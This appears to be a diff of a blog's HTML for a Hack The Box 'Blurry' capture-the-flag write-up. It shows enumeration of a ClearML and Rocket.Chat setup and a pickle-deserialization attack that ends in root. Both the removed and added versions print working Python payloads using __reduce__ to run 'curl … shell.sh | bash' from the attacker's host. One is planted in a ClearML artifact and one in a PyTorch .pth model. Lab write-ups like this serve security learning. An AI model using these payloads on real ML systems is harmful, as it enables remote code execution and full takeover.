@@ -1,1 +1,183 @@
-<html><head><meta charset="utf-8"></head><body><p>We only have port 22 and 80 open.</p><p>&nbsp;</p><p>3 subdomains, app, chat and files. This machine is going to have a TON of enumeration.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1190/534;" src="../img/posts/2024-06-09-Blurry(HTB)/01-9aa1d5652f.png" width="1190" height="534"></figure><p>&nbsp;</p><p>&nbsp;</p><p>App subdomain is the default page for the website which contains a sign in page. Entering our name allows us to “sign in”.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1742/875;" src="../img/posts/2024-06-09-Blurry(HTB)/02-c8cf3e7e9d.png" width="1742" height="875"></figure><p>&nbsp;</p><figure class="image"><img style="aspect-ratio:2488/909;" src="../img/posts/2024-06-09-Blurry(HTB)/03-0def47f415.png" width="2488" height="909"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Files subdomain seems to be nothing much.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:761/193;" src="../img/posts/2024-06-09-Blurry(HTB)/04-bef5a1e345.png" width="761" height="193"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Chat subdomain is a login for rocket chat which ive seen a couple times before. We can create an account and login.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2180/1356;" src="../img/posts/2024-06-09-Blurry(HTB)/05-3d75c7f74c.png" width="2180" height="1356"></figure><p>Chad Jippity is the name of an admin on rocketchat</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as Jippity</u></strong></span></p><p>&nbsp;</p><p>On the main webpage we can create api access keys which shows us yet another subdomain called api</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:709/754;" src="../img/posts/2024-06-09-Blurry(HTB)/06-2ab39fb605.png" width="709" height="754"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Following the steps above we can setup Clearml and &nbsp;upload pickle files.</p><p>&nbsp;</p><p>&nbsp;</p><p>There is a script being ran automatically every 60 seconds by Chad called “review_tasks”. This is looking at all projects in "Black Swan" and if they have the “review” tag and its opening them and then closing and deleting the task. I am almost certain this is how we will get a reverse shell.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:729/115;" src="../img/posts/2024-06-09-Blurry(HTB)/07-e7a0b49ad3.png" width="729" height="115"></figure><figure class="image image-style-block-align-left"><img style="aspect-ratio:929/734;" src="../img/posts/2024-06-09-Blurry(HTB)/08-e39da558e1.png" width="929" height="734"></figure><p><code>def main():</code></p><p><code>review_task = Task.init(project_name="Black Swan",</code></p><p><code>task_name="Review JSON Artifacts",</code></p><p><code>task_type=Task.TaskTypes.data_processing)</code></p><p>&nbsp;</p><p><code># Retrieve tasks tagged for review</code></p><p><code>tasks = Task.get_tasks(project_name='Black Swan', tags=["review"], allow_archived=False)</code></p><p>&nbsp;</p><p>Looking up ClearML there is a very recent CVE with RCE. This guide isnt very great but with a bunch of troubleshooting we can get a working payload.</p><p>https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/</p><p>I spent a lot of time troubleshooting this and trying to get help with ChatGPT but it was no help. I didnt realize we had to call the “Command” function twice which is what this line at the bottom of the code does <code>artifact_object=command</code>.</p><p>&nbsp;</p><p><code>import pickle</code><br><code>import os</code><br><code>from clearml import Task</code></p><p><code>class RunCommand:</code><br><code>&nbsp; &nbsp;def __reduce__(self):</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp;return (os.system, ('curl http://10.10.14.32:80/shell.sh | bash',))</code></p><p><code>command = RunCommand()</code></p><p><br><code># Initialize the ClearML task</code><br><code>task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"], output_uri=True)</code></p><p><code># Upload the dictionary as an artifact</code><br><code>task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True)</code><br>&nbsp;</p><p>&nbsp;</p><p>The script will open this file executing it and we will get a reverse shell.</p><p>&nbsp;</p><p>Step 1 - Create a file with the code above and run it. This will create a task and upload it to the website.</p><figure class="image"><img style="aspect-ratio:1144/146;" src="../img/posts/2024-06-09-Blurry(HTB)/09-b4c1e1ecac.png" width="1144" height="146"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Step 2 - Wait for the clean up script to run which executes our script giving us a shell.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:703/246;" src="../img/posts/2024-06-09-Blurry(HTB)/10-721c2cf117.png" width="703" height="246"></figure><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Privileged Escalation to Root</u></strong></span></p><p>&nbsp;</p><p>I then add our SSH key on the machine so we can ssh in as Jippity</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:616/219;" src="../img/posts/2024-06-09-Blurry(HTB)/11-86d1eee509.png" width="616" height="219"></figure><p>&nbsp;</p><p>We can run /usr/bin/evaluate_model /models/*.pth as root</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:868/152;" src="../img/posts/2024-06-09-Blurry(HTB)/12-cf85d7686a.png" width="868" height="152"></figure><p>&nbsp;</p><p>&nbsp;</p><p>I looked into generating our own pth file but it also had to be converted to a model dataset using CIFAR-10 which wasnt super easy to do. Instead I decided to copy the working demo model from /models to our own machine. Then I used chatgpt to create a python script to open the pth file, add our reverse shell command and save it as a new pth file keeping the dataset the same. It did require some editing to get it to work as ChatGPTs script had some errors.</p><p>&nbsp;</p><p>Step 1 - Copy the demo_model.pth file from the machine. We can startup a simple python webserver on the machine and download it to our own machine.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:242/122;" src="../img/posts/2024-06-09-Blurry(HTB)/13-046a93c95c.png" width="242" height="122"></figure><p>&nbsp;</p><p>Step 2 - Run the script to open the dataset and inject our reverse shell and save a new dataset as pwn.pth.</p><p>python script&nbsp;</p><p><code>import torch</code><br><code>import os</code></p><p><code># Define a malicious payload</code><br><code>class ReverseShellPayload:</code><br><code>&nbsp; &nbsp;def __reduce__(self):</code><br><code>&nbsp; &nbsp; &nbsp; &nbsp;return (os.system, ('curl http://10.10.14.32:8000/shell.sh | bash',))</code></p><p><code># Load the existing model</code><br><code>model = torch.load('demo_model.pth')</code></p><p><code># Inject the malicious payload</code><br><code>model['reverse_shell'] = ReverseShellPayload()</code></p><p><code># Save the modified model</code><br><code>torch.save(model, 'pwn.pth')</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1015/209;" src="../img/posts/2024-06-09-Blurry(HTB)/14-571bb36d12.png" width="1015" height="209"></figure><p>&nbsp;</p><p>Step 3 - Upload pwn.pth to the /models directory and run it as sudo. This has to be done quickly as there is a script cleaning up this directory.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:967/334;" src="../img/posts/2024-06-09-Blurry(HTB)/15-98ff15f78d.png" width="967" height="334"></figure><p>&nbsp;</p><p>Now in my case I just had the script reach back to our machine with curl and pipe the shell into bash but any command should work as this is ran by root.</p><p>&nbsp;</p><p>We are root.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:579/387;" src="../img/posts/2024-06-09-Blurry(HTB)/16-cb98584cb5.png" width="579" height="387"></figure><p>&nbsp;</p><p>&nbsp;</p></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Blurry | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-06-09-Blurry(HTB)/01-9aa1d5652f.png" alt="HTB: Blurry cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Blurry</h1>
+                <div class="post-meta">June 9, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <p>We only have port 22 and 80 open.</p>
+
+        <p>3 subdomains, app, chat and files. This machine is going to have a TON of enumeration.</p>
+
+        <img alt="Screenshot 1" height="534" src="../img/posts/2024-06-09-Blurry(HTB)/01-9aa1d5652f.png" style="aspect-ratio:1190/534;" width="1190"/>
+
+        <p>App subdomain is the default page for the website which contains a sign in page. Entering our name allows us to “sign in”.</p>
+
+        <img alt="Screenshot 2" height="875" src="../img/posts/2024-06-09-Blurry(HTB)/02-c8cf3e7e9d.png" style="aspect-ratio:1742/875;" width="1742"/>
+
+        <img alt="Screenshot 3" height="909" src="../img/posts/2024-06-09-Blurry(HTB)/03-0def47f415.png" style="aspect-ratio:2488/909;" width="2488"/>
+
+        <p>Files subdomain seems to be nothing much.</p>
+
+        <img alt="Screenshot 4" height="193" src="../img/posts/2024-06-09-Blurry(HTB)/04-bef5a1e345.png" style="aspect-ratio:761/193;" width="761"/>
+
+        <p>Chat subdomain is a login for rocket chat which ive seen a couple times before. We can create an account and login.</p>
+
+        <img alt="Screenshot 5" height="1356" src="../img/posts/2024-06-09-Blurry(HTB)/05-3d75c7f74c.png" style="aspect-ratio:2180/1356;" width="2180"/>
+
+        <p>Chad Jippity is the name of an admin on rocketchat</p>
+
+        <h1 style="color:red;">Shell as Jippity</h1>
+
+        <p>On the main webpage we can create api access keys which shows us yet another subdomain called api</p>
+
+        <img alt="Screenshot 6" height="754" src="../img/posts/2024-06-09-Blurry(HTB)/06-2ab39fb605.png" style="aspect-ratio:709/754;" width="709"/>
+
+        <p>Following the steps above we can setup Clearml and  upload pickle files.</p>
+
+        <p>There is a script being ran automatically every 60 seconds by Chad called “review_tasks”. This is looking at all projects in "Black Swan" and if they have the “review” tag and its opening them and then closing and deleting the task. I am almost certain this is how we will get a reverse shell.</p>
+
+        <img alt="Screenshot 7" height="115" src="../img/posts/2024-06-09-Blurry(HTB)/07-e7a0b49ad3.png" style="aspect-ratio:729/115;" width="729"/>
+
+        <img alt="Screenshot 8" height="734" src="../img/posts/2024-06-09-Blurry(HTB)/08-e39da558e1.png" style="aspect-ratio:929/734;" width="929"/>
+
+        <pre class="terminal"><code>def main():</code></pre>
+
+        <pre class="terminal"><code>review_task = Task.init(project_name="Black Swan",</code></pre>
+
+        <pre class="terminal"><code>task_name="Review JSON Artifacts",</code></pre>
+
+        <pre class="terminal"><code>task_type=Task.TaskTypes.data_processing)</code></pre>
+
+        <pre class="terminal"><code># Retrieve tasks tagged for review</code></pre>
+
+        <pre class="terminal"><code>tasks = Task.get_tasks(project_name='Black Swan', tags=["review"], allow_archived=False)</code></pre>
+
+        <p>Looking up ClearML there is a very recent CVE with RCE. This guide isnt very great but with a bunch of troubleshooting we can get a working payload.</p>
+
+        <p>https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/</p>
+
+        <p>I spent a lot of time troubleshooting this and trying to get help with ChatGPT but it was no help. I didnt realize we had to call the “Command” function twice which is what this line at the bottom of the code does <code>artifact_object=command</code>.</p>
+
+        <p><code>import pickle</code><br/><code>import os</code><br/><code>from clearml import Task</code></p>
+
+        <p><code>class RunCommand:</code><br/><code>   def __reduce__(self):</code><br/><code>       return (os.system, ('curl http://10.10.14.32:80/shell.sh | bash',))</code></p>
+
+        <pre class="terminal"><code>command = RunCommand()</code></pre>
+
+        <p><br/><code># Initialize the ClearML task</code><br/><code>task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"], output_uri=True)</code></p>
+
+        <p><code># Upload the dictionary as an artifact</code><br/><code>task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True)</code><br/> </p>
+
+        <p>The script will open this file executing it and we will get a reverse shell.</p>
+
+        <p>Step 1 - Create a file with the code above and run it. This will create a task and upload it to the website.</p>
+
+        <img alt="Screenshot 9" height="146" src="../img/posts/2024-06-09-Blurry(HTB)/09-b4c1e1ecac.png" style="aspect-ratio:1144/146;" width="1144"/>
+
+        <p>Step 2 - Wait for the clean up script to run which executes our script giving us a shell.</p>
+
+        <img alt="Screenshot 10" height="246" src="../img/posts/2024-06-09-Blurry(HTB)/10-721c2cf117.png" style="aspect-ratio:703/246;" width="703"/>
+
+        <h1 style="color:red;">Privileged Escalation to Root</h1>
+
+        <p>I then add our SSH key on the machine so we can ssh in as Jippity</p>
+
+        <img alt="Screenshot 11" height="219" src="../img/posts/2024-06-09-Blurry(HTB)/11-86d1eee509.png" style="aspect-ratio:616/219;" width="616"/>
+
+        <p>We can run /usr/bin/evaluate_model /models/*.pth as root</p>
+
+        <img alt="Screenshot 12" height="152" src="../img/posts/2024-06-09-Blurry(HTB)/12-cf85d7686a.png" style="aspect-ratio:868/152;" width="868"/>
+
+        <p>I looked into generating our own pth file but it also had to be converted to a model dataset using CIFAR-10 which wasnt super easy to do. Instead I decided to copy the working demo model from /models to our own machine. Then I used chatgpt to create a python script to open the pth file, add our reverse shell command and save it as a new pth file keeping the dataset the same. It did require some editing to get it to work as ChatGPTs script had some errors.</p>
+
+        <p>Step 1 - Copy the demo_model.pth file from the machine. We can startup a simple python webserver on the machine and download it to our own machine.</p>
+
+        <img alt="Screenshot 13" height="122" src="../img/posts/2024-06-09-Blurry(HTB)/13-046a93c95c.png" style="aspect-ratio:242/122;" width="242"/>
+
+        <p>Step 2 - Run the script to open the dataset and inject our reverse shell and save a new dataset as pwn.pth.</p>
+
+        <p>python script </p>
+
+        <p><code>import torch</code><br/><code>import os</code></p>
+
+        <p><code># Define a malicious payload</code><br/><code>class ReverseShellPayload:</code><br/><code>   def __reduce__(self):</code><br/><code>       return (os.system, ('curl http://10.10.14.32:8000/shell.sh | bash',))</code></p>
+
+        <p><code># Load the existing model</code><br/><code>model = torch.load('demo_model.pth')</code></p>
+
+        <p><code># Inject the malicious payload</code><br/><code>model['reverse_shell'] = ReverseShellPayload()</code></p>
+
+        <p><code># Save the modified model</code><br/><code>torch.save(model, 'pwn.pth')</code><br/> </p>
+
+        <img alt="Screenshot 14" height="209" src="../img/posts/2024-06-09-Blurry(HTB)/14-571bb36d12.png" style="aspect-ratio:1015/209;" width="1015"/>
+
+        <p>Step 3 - Upload pwn.pth to the /models directory and run it as sudo. This has to be done quickly as there is a script cleaning up this directory.</p>
+
+        <img alt="Screenshot 15" height="334" src="../img/posts/2024-06-09-Blurry(HTB)/15-98ff15f78d.png" style="aspect-ratio:967/334;" width="967"/>
+
+        <p>Now in my case I just had the script reach back to our machine with curl and pipe the shell into bash but any command should work as this is ran by root.</p>
+
+        <p>We are root.</p>
+
+        <img alt="Screenshot 16" height="387" src="../img/posts/2024-06-09-Blurry(HTB)/16-cb98584cb5.png" style="aspect-ratio:579/387;" width="579"/>
+    </article>
+
+</body>
+</html>
